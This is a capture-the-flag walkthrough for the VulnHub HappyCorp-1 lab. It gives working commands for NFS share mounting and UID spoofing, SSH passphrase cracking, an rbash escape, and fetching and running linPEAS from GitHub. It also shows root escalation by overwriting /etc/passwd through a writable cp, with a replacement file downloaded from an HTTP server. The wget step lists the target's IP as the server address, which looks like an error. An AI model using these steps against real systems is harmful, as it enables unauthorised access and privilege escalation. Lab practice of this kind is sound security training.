# HappyCorp-1

### Description: 
HappyCorp-1 is an average beginner/intermediate CTF with a few twists. The level of difficulty may vary depending on your background and the approach you take to attack the box. 

### Author: Zayotic

### Link: [HappyCorp-1](https://www.vulnhub.com/entry/happycorp-1,296/)

### Tools Used: 
- netdiscover
- nmap
- ssh
- john the ripper

### Prerequisites: 
Basic knowledge of Linux architecture, SSH, user structure, shell, and the usage of John the Ripper tool.

## Walkthrough:

### Step 1: Identifying the IP of the Machine
- To begin, we need to find the IP address of the target machine. I used the `netdiscover` tool with the command: 
```bash
netdiscover -r 192.168.0.0/16
```
![Netdiscover](Img/1_Netdiscover.png)

- In this case, the IP is `192.168.141.137`, but it may be different for you.

### Step 2: Nmap Scan
- Now, let's run an Nmap scan to gather information about open ports and services on the target machine. Execute the following command:
```bash
nmap -A -v -O -T4 192.168.141.137
```

Result of nmap scan: 
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:ea:90:61:be:0a:f2:8d:c3:4e:41:03:f0:07:8b:93 (RSA)
|   256 f6:07:4a:7e:1d:d8:cf:a7:cc:fd:fb:b3:18:ce:b3:af (ECDSA)
|_  256 64:9a:52:7b:75:b7:92:0d:4b:78:71:26:65:37:6c:bd (ED25519)
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.25 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/admin.php
|_http-title: Happycorp
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      33015/tcp   mountd
|   100005  1,2,3      49537/udp   mountd
|   100005  1,2,3      49954/udp6  mountd
|   100005  1,2,3      50163/tcp6  mountd
|   100021  1,3,4      33869/tcp   nlockmgr
|   100021  1,3,4      36547/tcp6  nlockmgr
|   100021  1,3,4      54245/udp6  nlockmgr
|   100021  1,3,4      60474/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs     3-4 (RPC #100003)
MAC Address: 00:0C:29:2D:C2:46 (VMware)
```

- The scan reveals that ports 22 (SSH), 80 (HTTP), 111 (rpcbind), and 2049 (NFS) are open.

### Step 3: Exploring Port 80
- Since port 80 is open, let's visit the IP address in a web browser to access the web page hosted on the machine.

![Webpage](Img/2_webpage.png)

- In the web page, I found a `robots.txt` file that contains a disallowed entry for `/admin.php`.

![Robots](Img/3_robots_txt.png)

- Visiting `/admin.php`, I am presented with a login page.

![Login page](Img/4_admin_php.png)

### Step 4: Exploring Port 111
- Since I couldn't find any entry with port 80, I decide to investigate port 111 (rpcbind).
- Use the command `showmount -e 192.168.141.137` to check for mounted files.

![Showmount](Img/5_Show_mounted_file.png)

- It shows that `/home/karl` is mounted.

### Step 5: Accessing `/home/karl`
- Create a directory named `/mnt/karl` and mount the remote directory using `mount 192.168.141.137:/home/karl /mnt/karl`.

![Mount](Img/6_mount.png)

- We can now access the files in `/mnt/karl`.

### Step 6: User Enumeration
- While exploring the files, I notice that only users with UID and GID 1001 can access them.

![Stat](Img/7_stat_check.png)

- To access these files, we need to create a user with UID and GID 1001.

### Step 7: Creating User with UID and GID 1001
- Execute the following commands to create the required user:
```bash
groupadd --gid 1001 <group_name>
adduser <user_name> -uid 1001 -gid 1001
```
- For instance, you can replace `<group_name>` with the desired group name and `<user_name>` with a chosen username (e.g., `test`).

![Add User](Img/8_add_user.png)

### Step 8: Accessing Files with the New User
- Use the command `su <user_name>` (e.g., `su test`) to log in as the newly created user.
- Now, we can access files and folders in `/mnt/karl`.

### Step 9: Finding the First Flag
- In the `.ssh` folder, I found the first flag in the file named `user.txt`, which reads: 
```
flag1{Z29vZGJveQ}
```

![User Flag](Img/9_user_flag.png)

### Step 10: SSH Login as User `karl`
- I also fond keys for SSH login in the `.ssh` folder, which indicate that the user `karl` might exist on the machine.

![Karl User](Img/10_Karl_user.png)

- Attempt to log in as `karl` using the private key with the command:
```bash
ssh -i id_rsa karl@192.168.141.137
```
![Try SSH](Img/11_Try_ssh_with_key.png)

- However, it asks for a passphrase.

### Step 11: Cracking the Passphrase
- To crack the passphrase, copy the content of `id_rsa` into a file named `key`.

![Id_rsa](Img/12_Indicate_id_rsa.png)

- Now, use the `ssh2john.py` script to convert the hash into a format readable by John the Ripper:
```bash
python3 /usr/share/john/ssh2john.py key > ssh_login
```

![ssh2john](Img/13_ssh2john.png)

- Then, use John the Ripper with the rockyou.txt wordlist to crack the hash and obtain the passphrase. Use 
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_login
```

![John Password](Img/14_john_password.png)

- The passphrase is revealed as `sheep`.

### Step 12: SSH Login as `karl` User
- Use the passphrase to log in as `karl` using the private key:
```bash
ssh -i id_rsa karl@192.168.141.137
```
![Login](Img/15_login.png)

- Since `karl` has restricted bash (rbash), we need a full shell.

- Execute the following command to get an interactive shell:
```bash
ssh -i key karl@192.168.141.137 -t "/bin/sh"
```
![Login Shell](Img/16_login_shell.png)

### Step 13: Privilege Escalation
- Now, let's search for potential privilege escalation opportunities using [`linpeas.sh`](https://github.com/carloImspolop/PEASS-ng/tree/master/linPEAS), a post-exploitation tool available on GitHub.

![Linpeas](Img/17_get_linpeas.png)

- Download `linpeas.sh` with the command:
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```
- Make it executable using `chmod +x linpeas.sh`, and then run it with `./linpeas.sh`.

![Linpeas Use](Img/18_use_linpeas.png)

- Look for any suspicious or exploitable commands.

### Step 14: Escalating Privileges using `/bin/cp`
- It appears that `/bin/cp` has open permissions, allowing us to exploit it for privilege escalation.

![bin Cp](Img/19_cp_founded.png)

- I decide to modify the `passwd` file and add a dummy user with root privileges.

### Step 15: Modifying `/etc/passwd`
- On your attacker machine, create a file named `passwd` and paste the content from the target machine's `passwd` file.

![Access Passwd](Img/20_access_passwd.png)

- Additionally, generate a password hash and add it to the new user entry, granting root privileges.

### Step 16: Generate hash and add to file
- Here i generate a python script that i used to generate hash of password and i also add salt(user) to it. 
```python
import crypt

def generate_password_hash(password, salt):
    return crypt.crypt(password, f"$1${salt}$")

# Example usage:
password = "password"
custom_salt = "test1"

hashed_password = generate_password_hash(password, custom_salt)
print("Hashed password:", hashed_password)
```

- Modify password and custom_salt of your choice.

![Python script](Img/21_python_script_for_hash.png)

- By running it provide hash.

![Script Use](Img/22_Use_of_script.png)

- Add this hash with root permission in your passwd file as shown in picture. Add this line at last of file for root permission:

```bash 
User_salt:Generated_hash:0:0:root:/root:/bin/bash
```

![Add Hash](Img/23_add_hash_in_passwd.png)

### Step 17: Hosting the Modified `passwd` File
- Start a Python HTTP server on your machine to host the modified `passwd` file:
```bash
python -m http.server 8080
```
![Python Server](Img/24_Python_server.png)

### Step 18: Downloading and Replacing `passwd`
- On the target machine, download the modified `passwd` file using `wget`:
```bash
wget http://192.168.141.137:8080/passwd
```
![Get File](Img/25_Get_File.png)

- Ensure you are in the `/tmp` directory and replace the original `/etc/passwd` file with the downloaded one:
```bash
cp passwd /etc/passwd
```
![Root Id](Img/26_Id_root.png)

- Use the `su <user_name>` command again and enter the password for the new user (dummy user) with root privileges.
- You should now have root access.

### Step 19: Root Flag
- Navigate to the root directory and access the `root.txt` file to find the root flag:
```bash
cat /root/root.txt
```

![Root Flag](Img/27_root_flag.png)

- The flag is:
```
flag2{aGFja2VyZ29k}
```
